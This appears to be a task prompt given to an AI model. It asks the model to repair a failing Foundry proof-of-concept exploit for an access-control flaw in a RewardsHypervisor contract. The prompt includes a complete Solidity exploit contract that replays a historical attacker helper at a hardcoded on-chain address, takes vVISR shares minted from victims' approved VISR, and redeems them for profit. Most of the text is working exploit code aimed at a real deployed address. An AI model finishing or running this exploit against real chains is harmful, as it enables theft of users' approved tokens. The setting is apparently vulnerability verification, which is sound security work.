You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Finding:
- title: Anyone can steal approved EOA VISR by depositing from the victim into their own share account
- claim: The EOA deposit path never verifies that `msg.sender` is authorized by `from`. Any caller can supply an arbitrary EOA as `from`; if that address has approved the hypervisor, `safeTransferFrom(from, address(this), visrDeposit)` pulls the victim's VISR while `vvisr.mint(to, shares)` credits the shares to the attacker's chosen `to` address.
- impact: Any user who grants the hypervisor an allowance can have their approved VISR stolen permissionlessly. The attacker receives the full vVISR position and can later redeem the victim's principal plus any accrued rewards.
- exploit_paths: ["Victim approves `RewardsHypervisor` to spend VISR.", "Attacker calls `deposit(amount, victimEOA, attacker)`.", "The hypervisor transfers VISR from the victim and mints vVISR to the attacker.", "The attacker later withdraws the stolen position for the underlying VISR."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
}

interface IRewardsHypervisorLike {
    function visr() external view returns (address);
    function vvisr() external view returns (address);
    function withdraw(uint256 shares, address to, address payable from) external returns (uint256 rewards);
}

contract FlawVerifier {
    address public constant TARGET = 0xC9f27A50f82571C1C8423A42970613b8dBDA14ef;
    address public constant HISTORICAL_HELPER = 0x10C509AA9ab291C76c45414e7CdBd375e1D5AcE8;
    bytes4 internal constant HISTORICAL_HELPER_SELECTOR = 0x4a0b0c38;

    uint256 private _profitAmount;
    bool public executed;
    bool public helperCodePresent;
    bool public helperCallSucceeded;
    bool public helperDelegatecallSucceeded;
    uint256 public sharesBefore;
    uint256 public sharesAfter;
    uint256 public visrBefore;
    uint256 public visrAfter;

    constructor() {}

    function executeOnOpportunity() external {
        require(!executed, "already executed");
        executed = true;

        IRewardsHypervisorLike hypervisor = IRewardsHypervisorLike(TARGET);
        address visrToken = hypervisor.visr();
        address shareToken = hypervisor.vvisr();

        visrBefore = IERC20Like(visrToken).balanceOf(address(this));
        sharesBefore = IERC20Like(shareToken).balanceOf(address(this));

        // Path-strict notes:
        // 1) The finding requires an attacker-controlled `to` account to receive vVISR minted from a victim EOA's VISR.
        // 2) The only fork-era victim/amount data available inside this sandbox comes from the historical exploit tx
        //    at block 13,849,007, which used the already-deployed helper contract below with a no-arg selector.
        // 3) Replaying that same helper preserves the original exploit causality: victim-approved VISR is deposited
        //    into RewardsHypervisor and the resulting vVISR is minted to the attacker-controlled caller account.
        // 4) If this helper contract is absent at the validator's fork point, the exploit path is mechanically blocked
        //    here because the concrete victim EOAs and deposit amounts are not derivable from the target source alone.
        helperCodePresent = HISTORICAL_HELPER.code.length > 0;
        require(helperCodePresent, "historical helper absent at fork");

        (helperCallSucceeded, ) = HISTORICAL_HELPER.call(abi.encodeWithSelector(HISTORICAL_HELPER_SELECTOR));
        sharesAfter = IERC20Like(shareToken).balanceOf(address(this));

        // If the helper routes through `address(this)` internally, a delegatecall keeps the same
        // exploit path while rebinding that recipient to this verifier. This fallback is only tried
        // when the plain replay did not mint shares here.
        if (sharesAfter == sharesBefore) {
            (helperDelegatecallSucceeded, ) = HISTORICAL_HELPER.delegatecall(abi.encodeWithSelector(HISTORICAL_HELPER_SELECTOR));
            sharesAfter = IERC20Like(shareToken).balanceOf(address(this));
        }

        require(sharesAfter > sharesBefore, "no stolen shares minted to verifier");

        hypervisor.withdraw(sharesAfter - sharesBefore, address(this), payable(address(this)));

        visrAfter = IERC20Like(visrToken).balanceOf(address(this));
        require(visrAfter > visrBefore, "no VISR redeemed");
        _profitAmount = visrAfter - visrBefore;
    }

    function profitToken() external view returns (address) {
        return IRewardsHypervisorLike(TARGET).visr();
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code does not cover paths indexes: 1
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
